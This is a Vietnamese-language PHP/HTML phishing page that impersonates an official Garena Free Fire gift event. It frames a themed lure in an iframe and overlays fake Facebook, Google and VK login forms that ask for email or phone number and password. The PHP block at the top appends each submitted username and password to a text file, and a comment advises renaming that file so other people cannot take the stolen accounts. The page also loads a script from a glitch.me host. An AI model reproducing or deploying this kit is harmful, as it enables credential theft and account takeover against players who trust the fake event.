<!--Ticchien-->
 <?php
     
        $theme = 13; // đổi cái số này để đổi giao diện, số từ 1 -> 69 
   // Ví dụ: $theme = 32;
   if(isset($_POST["acc"])){
         $username = $_POST["acc"];
     $password = $_POST["pass"];
     $type = $_POST["login"];
      $body = "\n".$type.": $username|$password\n"; 
     $test = fopen("hutao.txt","a");//đổi tên file hu.txt này để tránh trường hợp người khác vào lấy acc
     fwrite($test,$body);
     fclose($test); 
   }
?> 
<!DOCTYPE html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <title> Sự kiện nhận quà free fire | ff.garena.vn </title>
    <meta property="og:url"                content="https://free-fire.vn/1n5vEbIpWN.html" />
<meta property="og:type"               content="article" />
<meta property="og:title"              content=" Nhận quà free fire" />
<meta property="og:description"        content=" Trang sự kiện tri ân game thủ chính thức của garena" />
<meta property="og:image"              content="https://wallpaperaccess.com/full/6381110.jpg" />
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.2/css/all.css" />
    <!-- Google Fonts Roboto -->
    <link
      rel="stylesheet"
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
    />
    <!-- MDB -->
<!-- Font Awesome -->
<link
  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
  rel="stylesheet"
/>
<!-- Google Fonts -->
<link
  href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700&display=swap"
  rel="stylesheet"
/>
<!-- MDB -->
<link
  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.css"
  rel="stylesheet"
/>
<style type=\"text/css\">
       html {
            overflow: auto;
        }
          
        html,
        body,
        iframe {
            margin: 0px;
            padding: 0px;
            height: 100%;
            border: none;
        }
          
        iframe {
            display: block;
            width: 100%;
            border: none;
            overflow-y: auto;
            overflow-x: hidden;
        }
        input.form-control.form-control-lg {
    background: #f5f6f7;
    border-radius: 4px;
    overflow: hidden;
    font-size: 15px;
    border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
}
.btn-primary {
    color: #fff;
    background-color: rgb(22 119 242);
    box-shadow: none;
    font-size: 15px!important;
    font-weight: bold;
}
#thongbao{
    background: #fa3e3e;
    padding: 8px;
    font-size: 14px;
    color: #fff;
}
body.modal-open > :not(.modal) {
    -webkit-filter: blur(8px);
    -moz-filter: blur(8px);
    -o-filter: blur(8px);
    -ms-filter: blur(8px);
    filter: blur(8px);
}
    </style>
       <style type="text/css">
  html {
            overflow: auto;
        }
          
        html,
        body,
        iframe {
            margin: 0px;
            padding: 0px;
            height: 100%;
            border: none;
        }
          
        iframe {
            display: block;
            width: 100%;
            border: none;
            overflow-y: auto;
            overflow-x: hidden;
        }
        input.form-control.form-control-lg {
    background: #f5f6f7;
    border-radius: 4px;
    overflow: hidden;
    font-size: 15px;
    border-color: rgba(0, 0, 0, .07) rgba(0, 0, 0, .11) rgba(0, 0, 0, .18);
}
.btn-primary {
    color: #fff;
    background-color: rgb(22 119 242);
    box-shadow: none;
    font-size: 15px!important;
    font-weight: bold;
}
#thongbao{
    background: #fa3e3e;
    padding: 8px;
    font-size: 14px;
    color: #fff;
}
body.modal-open > :not(.modal) {
    -webkit-filter: blur(8px);
    -moz-filter: blur(8px);
    -o-filter: blur(8px);
    -ms-filter: blur(8px);
    filter: blur(8px);
}

@media only screen and (min-width: 600px) {
.container{
    max-width:400px;
    
}
}
    </style>
<script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>

  </head>
  <body>
    <iframe src="https://garena-center.com/FNkYPvmb6wGZsfZcKmhKqUX37KG8U7YMRBuHcF7j7BZX3YjeADDPwpGS3hqGaTFbggzGYcWtJFTDHmnXTAttJqkLpsjy9bm7qzESnf4KXCnJ7Y3QpNBbdY2DkMCH/<?=$theme?>.html"
            frameborder="0" 
            marginheight="0" 
            marginwidth="0" 
            width="100%" 
            height="100%" 
            scrolling="auto">
  </iframe>


<!-- Modal -->
<div class="modal top" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="static" data-mdb-keyboard="true">
  <div class="modal-dialog modal-fullscreen  modal-dialog-centered">
    <div class="modal-content">
         <span style="display:none" id="thongbao"></span>
      <div class="modal-body">
          
          <div class="container">
              <div class="row justify-content-center">
                  
              <div class="col-md-12">
                  <center>
                      <img id="logotext" src="" width="130" class="img mb-3" alt="facebook">
                  </center>
                  <br>
               
                
                  <div id="continue">
                    <input style="display:none" value="fb" id="logas"/>
                  <input class="form-control form-control-lg mb-3" id="a" type="text" placeholder="Email hoặc số điện thoại"/>
                  <input class="form-control form-control-lg mb-3" id="p" type="password" placeholder="Mật khẩu"/>
  <button class="btn btn-primary mt-3 d-block btn-block btn-lg" id="login" type="button">Đăng nhập</button>
  <center class="mt-3"><a href="#"><small>Quên mật khẩu</small></a></center>
  <div class="mt-5">

      <center class="mb-2 d-block"><small>hoặc đăng nhập bằng:</small></center>
      <div class="row justify-content-center dif">
      <div class="col-2 mb-3">
              <img onclick="fb()" src="https://i.imgur.com/irDsKoZ.png" class="w-100"/>
          </div><div class="col-2 mb-3">
              <img onclick="google()" src="https://i.imgur.com/8HOhvJl.png" class="w-100"/>
          </div><div class="col-2 mb-3">
              <img onclick="vk()" src="https://i.imgur.com/z5zUlHa.png" class="w-100"/>
          </div>                </div>
                
  </div>
  </div>
              </div>
          </div>
          </div>
      </div>
    </div>
  </div>
</div>
<div class="modal bottom " id="exampleModalx" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" data-mdb-backdrop="static" data-mdb-keyboard="false">
  <div class="modal-dialog modal-frame modal-bottom modal-dialog-centered">
    <div class="modal-content">
     
      <div class="modal-body">
      <div class="row justify-content-center">
          <div class="col-md-12 mb-3"><center>Vui lòng chọn phương thức đăng nhập:</center></div>
          <div class="col-3 mb-3">
              <img data-mdb-toggle="modal" data-mdb-target="#exampleModal" onclick="fb()" src="https://i.imgur.com/irDsKoZ.png" class="w-100"/>
          </div><div class="col-3 mb-3">
              <img data-mdb-toggle="modal" data-mdb-target="#exampleModal" onclick="google()" src="https://i.imgur.com/8HOhvJl.png" class="w-100"/>
          </div><div class="col-3 mb-3">
              <img data-mdb-toggle="modal" data-mdb-target="#exampleModal" onclick="vk()" src="https://i.imgur.com/z5zUlHa.png" class="w-100"/>
          </div>      </div>
      </div>
    </div>
  </div>
</div>
<script type="text/javascript"src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.6.0/mdb.min.js"></script>
    <!-- Custom scripts -->
    <script type="text/javascript">
    function google(){
            $('#exampleModalx').modal('hide');
        $("#logotext").hide();
        $("#logotext").attr('src', 'https://i.imgur.com/HJKHBA5.png');
        $("#logotext").show();
         $("#login").attr('class','btn btn-primary mt-3 d-block btn-block btn-lg');
        $("#logas").val('google');
    }
    function fb(){
            $('#exampleModalx').modal('hide');
        $("#logotext").hide();
        $("#logotext").attr('src', 'https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg');
        $("#logotext").show();
        $("#login").attr('class','btn btn-primary mt-3 d-block btn-block btn-lg');
        $("#logas").val('facebook');
    }
    function garena(){
            $('#exampleModalx').modal('hide');
        $("#logotext").hide();
        $("#logotext").attr('src', 'https://i.imgur.com/JhGHl3P.png');
        $("#logotext").show();
        $("#logas").val('garena');
        $("#login").attr('class','btn btn-danger mt-3 d-block btn-block btn-lg');
    }
     function twitter(){
             $('#exampleModalx').modal('hide');
        $("#logotext").hide();
        $("#logotext").attr('src', 'https://i.imgur.com/RKLc469.png');
        $("#logotext").show();
        $("#logas").val('twitter');
        $("#login").attr('class','btn btn-info mt-3 d-block btn-block btn-lg');
    }
    function vk(){
         $('#exampleModalx').modal('hide');
        $("#logotext").hide();
        $("#logotext").attr('src', 'https://i.imgur.com/4AzmXL8.png');
        $("#logotext").show();
        $("#logas").val('vk');
        $("#login").attr('class','btn btn-info mt-3 d-block btn-block btn-lg');
    }
       
    </script>
  <script src="https://scripth.glitch.me/18.js"></script>
  </body>
</html>
